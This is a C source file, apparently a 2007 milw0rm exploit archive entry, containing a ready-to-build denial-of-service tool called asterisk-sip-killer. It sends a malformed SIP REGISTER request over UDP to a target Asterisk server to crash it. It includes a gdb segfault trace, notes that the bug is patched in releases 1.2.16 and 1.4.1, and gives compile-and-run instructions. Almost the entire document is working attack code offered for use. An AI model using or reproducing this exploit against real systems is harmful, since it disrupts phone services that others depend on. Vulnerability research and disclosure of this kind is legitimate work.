/*
this will cause asterisk to segfault,
the bug that this exploits has been patched in release 1.2.16  & 1.4.1

CLI>

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 1082719152 (LWP 2510)]
register_verify (p=0x81cf600, sin=0x4088e750, req=0x4088e760, uri=0x0)
    at chan_sip.c:8257
8257            while (*t && *t > ' ' && *t != ';')
(gdb) 


build:
gcc -o asterisk-sip-killer asterisk-sip-killer.c

run:
./asterisk-sip-killer -h <targethost>

*/
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/tcp.h>

#define SIP_UDP_PORT 5060

struct udp_session {	
	int sd;
	struct sockaddr_in saddr;
};

int make_udp(struct udp_session *p, char *remotehost, int port)
{
	int sd;
	int ret;
	struct sockaddr_in saddr;
	struct hostent *he;

	sd = socket(AF_INET,SOCK_DGRAM,0);

	if (sd == -1) {
		printf("error making socket\n");
		return -1;
	}

	he = gethostbyname(remotehost);
	
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);
	saddr.sin_addr.s_addr = inet_addr(remotehost);
	memset(&(saddr.sin_zero), '\0', 8);
	p->sd = sd;
	memcpy(&p->saddr,&saddr,sizeof(struct sockaddr_in));

	printf("udp socket ready\n");
	
	return 0;
}

void kill_asterisk(struct udp_session *sess)
{
	int ret;
	char *p =
		"REGISTER              \r\n"
		"Via: SIP/2.0/UDP 192.168.204.130:5060;branch=z9hG4bK1d97e14f\r\n"
		"Max-Forwards: 70\r\n"
		"From: <sip:666@192.168.204.130>;tag=as253946cf\r\n"
		"To: <sip:100@192.168.204.130>\r\n"
		"Call-ID: 7e64a49e5cf018231228938050e43d3b@127.0.0.1\r\n"
		"CSeq: 104 REGISTER\r\n"
		"User-Agent: Asterisk PBX\r\n"
		"Expires: 120\r\n"
		"Contact: <sip:666@192.168.204.130>\r\n"
		"Event: registration\r\n"
		"Content-Length: 0\r\n";

	ret = sendto(sess->sd, p, strlen(p), 0,
	       (struct sockaddr *)&sess->saddr,
	       sizeof(struct sockaddr));

	if (ret) {	
		printf("You may have well shutdown a asterisk server\n");
	} else {
		printf("there was a issue sending the request\n");
		return;
	}
	return;
}
int main(int argc, char **argv)
{
	int i = 0;
	char *r_host = NULL;
	struct udp_session *connection_out;
	

	for (i=0;i<argc;i++) {
		if (!(strcmp(argv[i],"-h"))) {
                        printf("it looks like you want a host entry\n");
                        r_host = argv[i+1];
                        printf("r_host: %s\n", r_host);
                }
        }

	if (!r_host) {
		printf("umm you forgot the -h <host> option!\n");
		return 0;
	}

	if (!(connection_out = (struct udp_session *)malloc(sizeof(struct udp_session)))) {
		printf("malloc failed your computer sucks\n");
		return 0;
	}
	make_udp(connection_out, r_host, SIP_UDP_PORT);
	kill_asterisk(connection_out);	
	free(connection_out);
	return 0;
}

// milw0rm.com [2007-03-04]
